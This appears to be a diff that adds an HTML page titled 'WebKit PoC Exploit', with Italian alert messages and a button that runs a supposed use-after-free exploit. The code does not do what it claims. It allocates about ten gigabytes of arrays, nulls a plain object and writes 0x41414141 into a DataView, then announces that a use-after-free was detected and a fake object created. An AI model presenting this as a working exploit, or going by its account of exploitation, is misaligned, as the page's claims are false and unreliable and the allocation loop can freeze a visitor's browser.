@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebKit PoC Exploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+
+        button {
+            background-color: #000000;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #444444;
+        }
+    </style>
+</head>
+<body>
+    <h1>WebKit Exploit PoC</h1>
+    <p></p>
+    <button id="startExploit" onclick="startExploit()">Avvia Exploit</button>
+
+    <script>
+        function forceGC() {
+            alert("Forzando il Garbage Collector...");
+            let bigArray = [];
+            for (let i = 0; i < 10000; i++) {
+                bigArray.push(new Uint8Array(1024 * 1024));
+            }
+            bigArray = null;
+            alert("Garbage Collection eseguita.");
+        }
+
+        function fakeobj(addr) {
+            alert("Creando oggetto falsificato...");
+            let buffer = new ArrayBuffer(8);
+            let view = new DataView(buffer);
+            view.setFloat64(0, addr, true);
+            return view;
+        }
+
+        function triggerUAF() {
+            alert("Inizio trigger UAF...");
+            let overlay = { key: 123 };
+            overlay = null;
+            alert("Oggetto overlay eliminato. Forzando il GC...");
+            forceGC();
+
+            setTimeout(() => {
+                try {
+                    alert("Use-After-Free rilevato! Creazione di oggetto falso in corso...");
+                    let fakeObject = fakeobj(0x41414141);
+                    alert("Oggetto falsificato creato con successo!");
+                } catch (e) {
+                    alert("Errore durante l'esecuzione: " + e.message);
+                }
+            }, 200);
+        }
+
+        function startExploit() {
+            alert("Avvio exploit...");
+            try {
+                triggerUAF();
+            } catch (e) {
+                alert("Errore durante l'avvio dell'exploit: " + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
